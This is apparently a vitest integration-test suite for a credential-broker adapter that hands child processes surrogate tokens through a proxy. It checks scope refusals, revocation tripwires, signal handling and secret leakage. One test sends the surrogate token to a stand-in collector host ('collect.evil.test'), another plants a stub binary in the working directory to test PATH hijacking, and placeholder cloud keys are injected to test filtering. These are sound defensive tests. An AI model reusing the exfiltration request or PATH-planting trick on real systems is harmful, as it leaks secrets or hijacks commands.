import { existsSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { delimiter, dirname, join } from "node:path";
import { afterEach, beforeAll, describe, expect, it } from "vitest";

import { parseCredentialBindings } from "../../src/binding.js";
import { buildLaunch } from "../../src/launch.js";
import { exitCodeOf, outcomeError, parseOutcome } from "../../src/outcome.js";
import { createOpenSesameSecretsPort } from "../../src/port.js";
import {
	PATHS_WITHOUT_METHODS_SCHEMA,
	runRawSchema,
	UNBOUNDED_SCHEMA,
} from "../support/raw-run.js";
import { record } from "./evidence.js";
import { type Kit, resolveKit } from "./kit.js";
import { get, runChild } from "./run-child.js";
import { SANDBOX_PASS_ENV, Sandbox, STORE_PASSPHRASE } from "./sandbox.js";
import { canReadProcesses, processesNaming, startDecoy } from "./sweep.js";
import {
	startUpstream,
	UPSTREAM_BODY,
	UPSTREAM_HOST,
	type Upstream,
} from "./tls.js";

const REFUSAL = "request refused by the credential broker";
const PROJECT = `https://${UPSTREAM_HOST}/v9/projects/x`;

function bindings(
	paths: readonly string[] = ["/v9/projects", "/v13/deployments"],
	methods: readonly string[] = ["GET", "POST"],
) {
	return parseCredentialBindings({
		bindings: [
			{
				locator: "hobo-token://vercel/deploy",
				connection: "conn://acme/vercel",
				provider: "vercel",
				env_name: "VERCEL_TOKEN",
				paths: [...paths],
				methods: [...methods],
				projection: "legacy-token",
			},
		],
	});
}

let kit: Kit;
const sandboxes: Sandbox[] = [];
const upstreams: Upstream[] = [];

beforeAll(() => {
	// Fails, with the way to build a kit, when HOBO_OPENSESAME_KIT is unset: it never skips.
	kit = resolveKit(process.env);
});

afterEach(async () => {
	for (const upstream of upstreams.splice(0)) await upstream.close();
	for (const sandbox of sandboxes.splice(0)) sandbox.cleanup();
});

async function fresh(setUp: "full" | "bare" | "no-entry" = "full") {
	const sandbox = Sandbox.create(kit);
	sandboxes.push(sandbox);
	const upstream = await startUpstream(sandbox.pki);
	upstreams.push(upstream);
	if (setUp === "full") sandbox.setUp();
	else if (setUp === "no-entry") {
		sandbox.init();
		sandbox.installPlugin();
	} else sandbox.init();
	return { sandbox, upstream, env: sandbox.runEnv(upstream) };
}

describe("a proxied run under the real opensesame", () => {
	it("the child holds osr_ and the upstream saw the real token once", async () => {
		const { sandbox, upstream, env } = await fresh();
		const run = await runChild(
			sandbox,
			{ requests: [get(PROJECT, "project")] },
			{ bindings: bindings(), env },
		);

		expect(run.outcome).toMatchObject({ kind: "child_exit", exitCode: 0 });
		expect(run.stderr).toContain("TEST BUILD");

		// What the child holds: a surrogate, a proxy, a CA, and not the key to the store.
		const held = run.childEnv ?? {};
		expect(held.VERCEL_TOKEN).toMatch(/^osr_[0-9a-f]{32}$/u);
		expect(held.HTTPS_PROXY).toMatch(/^http:\/\//u);
		expect(held.NODE_USE_ENV_PROXY).toBe("1");
		expect(held.HOBO_OPENSESAME_CHILD).toBe("1");
		expect(held.OPENSESAME_STORE_PASSWORD).toBeUndefined();
		expect(held.NODE_EXTRA_CA_CERTS).toBeDefined();

		// The upstream saw the real (dummy) token exactly once, on the one request, and no surrogate anywhere.
		const hits = upstream.hits();
		expect(hits).toHaveLength(1);
		expect([hits[0]?.method, hits[0]?.path]).toEqual(["GET", "/v9/projects/x"]);
		expect(hits[0]?.authorization).toBe(`Bearer ${sandbox.token}`);
		expect(
			hits[0]?.allValues.filter((value) => value.includes(sandbox.token)),
		).toHaveLength(1);
		expect(hits[0]?.allValues.some((value) => value.includes("osr_"))).toBe(
			false,
		);

		// Global fetch with NODE_USE_ENV_PROXY=1 reached it through the run's proxy.
		expect(run.results).toEqual([
			{ label: "project", status: 200, body: UPSTREAM_BODY },
		]);

		// The token is in none of what the child was given.
		expect(JSON.stringify(held)).not.toContain(sandbox.token);
		expect(run.argv.join(" ")).not.toContain(sandbox.token);
		expect(run.stderr).not.toContain(sandbox.token);
		expect(sandbox.filesNaming(sandbox.token)).toEqual([]);

		// The port, handed the child's own environment, serves exactly that surrogate.
		const port = createOpenSesameSecretsPort({
			bindings: bindings(),
			env: held,
		});
		const access = await port.access("hobo-token://vercel/deploy");
		expect(access).toMatchObject({
			status: "ok",
			material: held.VERCEL_TOKEN,
			source: "provider-federation",
		});

		record("surrogate-delivered", {
			upstreamRequests: hits.map(
				(hit) => `${hit.method} ${hit.path} Authorization=${hit.authorization}`,
			),
			upstreamHeaderValuesWithOsr: hits
				.flatMap((hit) => hit.allValues)
				.filter((value) => value.includes("osr_")).length,
			childVercelToken: held.VERCEL_TOKEN ?? "",
			childHttpsProxyPresent: held.HTTPS_PROXY !== undefined,
			childNodeUseEnvProxy: held.NODE_USE_ENV_PROXY ?? "",
			childArgv: run.argv,
			fetchResult: `${run.results[0]?.status} ${run.results[0]?.body}`,
			realTokenInChildEnvOrArgv: false,
		});
	});

	it("a request outside the declared scope is refused, noticed and told nothing", async () => {
		const { sandbox, upstream, env } = await fresh();
		const run = await runChild(
			sandbox,
			{
				requests: [
					get(PROJECT, "in scope"),
					{
						label: "wrong method",
						url: `https://${UPSTREAM_HOST}/v13/deployments`,
						method: "POST",
						authorization: "surrogate",
					},
					get(`https://${UPSTREAM_HOST}/v2/user`, "wrong path"),
					get(PROJECT, "no surrogate", null),
					get(PROJECT, "in scope again"),
				],
			},
			{ bindings: bindings(["/v9/projects"], ["GET"]), env },
		);
		expect(run.outcome).toMatchObject({ kind: "child_exit", exitCode: 0 });
		expect(run.results.map((result) => result.status)).toEqual([
			200, 403, 403, 403, 200,
		]);
		for (const refused of run.results.slice(1, 4))
			expect(refused.body).toBe(REFUSAL);
		expect(upstream.hits().map((hit) => `${hit.method} ${hit.path}`)).toEqual([
			"GET /v9/projects/x",
			"GET /v9/projects/x",
		]);
		const kinds = sandbox.noticeKinds();
		expect(kinds).toContain("surrogate.out_of_scope");
		expect(kinds.every((kind) => kind.startsWith("surrogate."))).toBe(true);
		record("out-of-scope", {
			childSaw: run.results.map(
				(result) => `${result.label}: ${result.status}`,
			),
			upstreamRequests: upstream
				.hits()
				.map((hit) => `${hit.method} ${hit.path}`),
			noticeKinds: kinds,
		});
	});

	it("a surrogate sent to another host revokes the run, stops the child and exits 77", async () => {
		const { sandbox, upstream, env } = await fresh();
		const run = await runChild(
			sandbox,
			{
				lingerMs: 60_000,
				requests: [
					get(PROJECT, "in scope"),
					get("https://collect.evil.test/x", "misdirected"),
					get(PROJECT, "after"),
				],
			},
			{ bindings: bindings(), env },
		);
		expect(run.outcome).toMatchObject({ kind: "tripwire", exitCode: 77 });
		expect(run.seconds).toBeLessThan(30);
		expect(run.stderr).toContain("surrogate.misdirected");
		expect(run.stderr).toContain("revoked (1)");
		expect(run.stderr).not.toContain("osr_");
		expect(run.results[0]?.status).toBe(200);
		for (const later of run.results.slice(1))
			expect(later).toMatchObject({ status: 403, body: REFUSAL });
		expect(upstream.hits()).toHaveLength(1);
		expect(sandbox.noticeKinds()).toContain("surrogate.misdirected");
		expect(outcomeError(run.outcome)?.code).toBe("tripwire_misdirected");
		expect(exitCodeOf(run.outcome)).toBe(77);
		record("misdirected", {
			exitCode: run.outcome.exitCode,
			kind: run.outcome.kind,
			secondsToStop: run.seconds,
			upstreamRequests: upstream.hits().length,
		});
	});

	it("SIGTERM passed on by the adapter ends the run: revoked, child stopped, 143", async () => {
		const { sandbox, env } = await fresh();
		const run = await runChild(
			sandbox,
			{ wait: true, requests: [get(PROJECT, "never")] },
			{
				bindings: bindings(),
				env,
				whileHeld: async (host) => {
					host.emit("SIGTERM", "SIGTERM");
				},
			},
		);
		expect(run.outcome).toMatchObject({ kind: "signalled", exitCode: 143 });
		expect(run.stderr).toContain("SIGTERM: the run is ended");
		expect(run.results).toEqual([]);
		const pid = Number(readFileSync(`${run.out}/pid`, "utf8"));
		expect(existsSync(`/proc/${pid}`)).toBe(false);
		record("sigterm", {
			exitCode: run.outcome.exitCode,
			kind: run.outcome.kind,
			notice: run.outcome.notice,
		});
	});

	it("the plugin off: exit 0 with a placeholder, which the adapter calls placeholders_only and the port refuses", async () => {
		const { sandbox, upstream, env } = await fresh();
		sandbox.disablePlugin();
		const run = await runChild(
			sandbox,
			{ requests: [get(PROJECT, "project")] },
			{ bindings: bindings(), env },
		);
		expect(run.outcome).toMatchObject({
			kind: "placeholders_only",
			exitCode: 0,
		});
		expect(run.childEnv?.VERCEL_TOKEN).toMatch(/^ostest_[0-9a-f]{32}$/u);
		expect(run.childEnv?.HTTPS_PROXY).toBeUndefined();
		expect(upstream.hits()).toEqual([]);
		expect(outcomeError(run.outcome)?.code).toBe("placeholders_only");
		expect(exitCodeOf(run.outcome)).toBe(1);
		const port = createOpenSesameSecretsPort({
			bindings: bindings(),
			env: run.childEnv ?? {},
		});
		expect(await port.access("hobo-token://vercel/deploy")).toMatchObject({
			status: "denied",
			code: "placeholders_only",
		});
		record("plugin-off", {
			childExit: 0,
			kind: run.outcome.kind,
			adapterExit: exitCodeOf(run.outcome),
			childHolds: run.childEnv?.VERCEL_TOKEN?.slice(0, 7) ?? "",
			notice: run.outcome.notice,
		});
	});

	it("the plugin never installed: the same, with the hint to install it", async () => {
		const { sandbox, env } = await fresh("bare");
		const run = await runChild(
			sandbox,
			{ requests: [] },
			{ bindings: bindings(), env },
		);
		expect(run.outcome).toMatchObject({
			kind: "placeholders_only",
			exitCode: 0,
		});
		expect(run.stderr).toContain("opensesame plugins install surrogate-proxy");
	});

	it("no sealed entry: a placeholder, and the line says where to store the token", async () => {
		const { sandbox, env } = await fresh("no-entry");
		const run = await runChild(
			sandbox,
			{ requests: [] },
			{ bindings: bindings(), env },
		);
		expect(run.outcome).toMatchObject({
			kind: "placeholders_only",
			exitCode: 0,
		});
		expect(run.stderr).toContain(
			"opensesame pass insert connections/acme/vercel",
		);
		expect(run.childEnv?.VERCEL_TOKEN).toMatch(/^ostest_/u);
	});

	it("a store opened with the wrong passphrase: the child never starts", async () => {
		const { sandbox, env } = await fresh();
		const run = await runChild(
			sandbox,
			{ requests: [] },
			{
				bindings: bindings(),
				env: { ...env, OPENSESAME_STORE_PASSWORD: `not-${STORE_PASSPHRASE}` },
			},
		);
		expect(run.outcome).toMatchObject({
			kind: "store_unreadable",
			exitCode: 1,
		});
		expect(run.childEnv).toBeUndefined();
		record("wrong-passphrase", {
			kind: run.outcome.kind,
			exitCode: run.outcome.exitCode,
			notice: run.outcome.notice,
		});
	});

	it("a plugin that changed since it was pinned: the run fails, with no fallback to placeholders", async () => {
		const { sandbox, env } = await fresh();
		const { appendFileSync } = await import("node:fs");
		appendFileSync(sandbox.installedPlugin(), "\0");
		const run = await runChild(
			sandbox,
			{ requests: [] },
			{ bindings: bindings(), env },
		);
		expect(run.outcome).toMatchObject({
			kind: "plugin_pin_mismatch",
			exitCode: 1,
		});
		expect(run.childEnv).toBeUndefined();
	});

	it("an env-spec bridge without its parser is bridge_missing, not a bad schema", async () => {
		const { sandbox, env } = await fresh();
		const { copyFileSync, mkdirSync } = await import("node:fs");
		mkdirSync(sandbox.path("bare-bridge"), { mode: 0o755 });
		copyFileSync(
			kit.bridge,
			sandbox.path("bare-bridge/opensesame-env-parse.mjs"),
		);
		const run = await runChild(
			sandbox,
			{ requests: [] },
			{
				bindings: bindings(),
				env: {
					...env,
					OPENSESAME_ENV_PARSE: sandbox.path(
						"bare-bridge/opensesame-env-parse.mjs",
					),
				},
			},
		);
		expect(run.outcome).toMatchObject({ kind: "bridge_missing", exitCode: 1 });
		expect(run.childEnv).toBeUndefined();
	});

	it("a scope the plugin will not issue, and a scope the schema will not parse, are told apart", async () => {
		const { sandbox, env } = await fresh();
		expect(runRawSchema(kit.opensesame, env, UNBOUNDED_SCHEMA)).toMatchObject({
			kind: "scope_unbounded",
			exitCode: 1,
		});
		expect(
			runRawSchema(kit.opensesame, env, PATHS_WITHOUT_METHODS_SCHEMA),
		).toMatchObject({ kind: "schema_refused", exitCode: 1 });
		expect(sandbox.noticeKinds()).toEqual([]);
	});

	it("the real schema the adapter renders is accepted by the real binary (`dev resolve` shows the scope)", async () => {
		const { sandbox, env } = await fresh();
		const { renderEnvSchema } = await import("../../src/schema.js");
		const { writeFileSync } = await import("node:fs");
		const file = sandbox.path("work/.env.schema");
		writeFileSync(
			file,
			renderEnvSchema(
				bindings(["/v9/projects", "/v13/deployments"], ["GET", "POST"]),
			),
		);
		const resolved = sandbox.cli(
			["dev", "--agent", "--schema", file, "resolve"],
			env,
		);
		expect(resolved.status).toBe(0);
		expect(resolved.stdout).toContain("/v13/deployments");
		expect(resolved.stdout).toMatch(/ostest_[0-9a-f]{32}/u);
		expect(resolved.stdout).not.toContain(sandbox.token);
	});

	it("the token appears in no file, environment, argument or process listing the run left", async () => {
		const { sandbox, env } = await fresh();
		const decoy = startDecoy(sandbox.token);
		try {
			const run = await runChild(
				sandbox,
				{ wait: true, requests: [get(PROJECT, "project")] },
				{
					bindings: bindings(),
					env,
					whileHeld: async (_host, out) => {
						const { writeFileSync } = await import("node:fs");
						if (canReadProcesses()) {
							// The decoy holds the token in its environment: the sweep finds it, and only it.
							expect(processesNaming(sandbox.token)).toEqual([
								`${decoy.pid} environ`,
							]);
						}
						writeFileSync(`${out}/go`, "");
					},
				},
			);
			expect(run.outcome).toMatchObject({ kind: "child_exit", exitCode: 0 });
			expect(sandbox.filesNaming(sandbox.token)).toEqual([]);
			expect(run.stderr).not.toContain(sandbox.token);
		} finally {
			decoy.stop();
		}
	});

	it("the child holds nothing from the caller's environment but what the allowlist and passEnv let through", async () => {
		const { sandbox, env } = await fresh();
		const foreign = {
			AWS_ACCESS_KEY_ID: "AKIAIOSFODNN7EXAMPLE",
			AWS_SECRET_ACCESS_KEY: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
			GITHUB_TOKEN: "ghp_not_a_real_token_0123456789",
			CLOUDFLARE_API_TOKEN: "cf-not-a-real-token",
			NPM_TOKEN: "npm_not_a_real_token",
			HOBO_API_KEY: "hobo-not-a-real-key",
		};
		const run = await runChild(
			sandbox,
			{ requests: [] },
			{ bindings: bindings(), env: { ...env, ...foreign } },
		);
		expect(run.outcome).toMatchObject({ kind: "child_exit", exitCode: 0 });
		const held = run.childEnv ?? {};
		for (const name of Object.keys(foreign)) {
			expect(held, name).not.toHaveProperty(name);
		}
		expect(JSON.stringify(held)).not.toContain("not-a-real");
		expect(JSON.stringify(held)).not.toContain("AKIA");
		// What a command needs is there, and so is the surrogate.
		expect(held.PATH).toBeDefined();
		expect(held.HOME).toBe(sandbox.path("home"));
		expect(held.VERCEL_TOKEN).toMatch(/^osr_[0-9a-f]{32}$/u);
		expect(held.OPENSESAME_STORE_PASSWORD).toBeUndefined();
		// Listed by name, a variable is passed on as the caller's own choice.
		const listed = await runChild(
			sandbox,
			{ requests: [] },
			{
				bindings: bindings(),
				env: { ...env, ...foreign },
				passEnv: [...SANDBOX_PASS_ENV, "GITHUB_TOKEN"],
			},
		);
		expect(listed.childEnv?.GITHUB_TOKEN).toBe(foreign.GITHUB_TOKEN);
		expect(listed.childEnv).not.toHaveProperty("AWS_SECRET_ACCESS_KEY");
	});

	it("a real token already in the process refuses the run before OpenSesame is started, wherever the binding puts the surrogate", async () => {
		const { sandbox, env } = await fresh();
		const other = parseCredentialBindings({
			bindings: [
				{
					locator: "hobo-token://vercel/deploy",
					connection: "conn://acme/vercel",
					provider: "vercel",
					env_name: "HOBO_VERCEL",
					paths: ["/v9/projects"],
					methods: ["GET"],
					projection: "legacy-token",
				},
			],
		});
		for (const name of ["VERCEL_TOKEN", "VERCEL_API_TOKEN"]) {
			await expect(
				runChild(
					sandbox,
					{ requests: [] },
					{ bindings: other, env: { ...env, [name]: sandbox.token } },
				),
			).rejects.toMatchObject({ code: "real_credential_in_env" });
		}
		// Nothing started: no schema was written, and no command ever recorded its environment.
		expect(
			readdirSync(sandbox.path("work")).filter((n) =>
				n.startsWith("hobo-opensesame-"),
			),
		).toEqual([]);
		for (const run of readdirSync(sandbox.path("out"))) {
			expect(existsSync(join(sandbox.path("out"), run, "env.txt"))).toBe(false);
		}
		expect(sandbox.noticeKinds()).toEqual([]);
	});

	it("a bare opensesame is found on absolute PATH entries only: a stub planted in the working directory is never started, the real binary is identified, and the run is the real one", async () => {
		const { sandbox, env } = await fresh();
		const planted = sandbox.path("work");
		const ran = sandbox.path("stub-ran");
		writeFileSync(
			join(planted, "opensesame"),
			`#!/bin/sh\necho "$@" >> '${ran}'\n`,
			{ mode: 0o755 },
		);
		const here = process.cwd();
		process.chdir(planted);
		try {
			const run = await runChild(
				sandbox,
				{ requests: [] },
				{
					bindings: bindings(),
					bin: "opensesame",
					env: {
						...env,
						PATH: `.${delimiter}${delimiter}${dirname(kit.opensesame)}${delimiter}${env.PATH ?? ""}`,
					},
				},
			);
			expect(run.outcome).toMatchObject({ kind: "child_exit", exitCode: 0 });
			expect(run.childEnv?.VERCEL_TOKEN).toMatch(/^osr_[0-9a-f]{32}$/u);
		} finally {
			process.chdir(here);
		}
		expect(existsSync(ran)).toBe(false);
	});

	it("buildLaunch refuses to start inside the run it started", () => {
		expect(() =>
			buildLaunch({
				bin: kit.opensesame,
				schemaPath: "/x",
				argv: ["true"],
				bindings: bindings(),
				env: { HOBO_OPENSESAME_CHILD: "1" },
			}),
		).toThrow(/already runs under OpenSesame/u);
		expect(parseOutcome(0, null, "").kind).toBe("child_exit");
	});
});
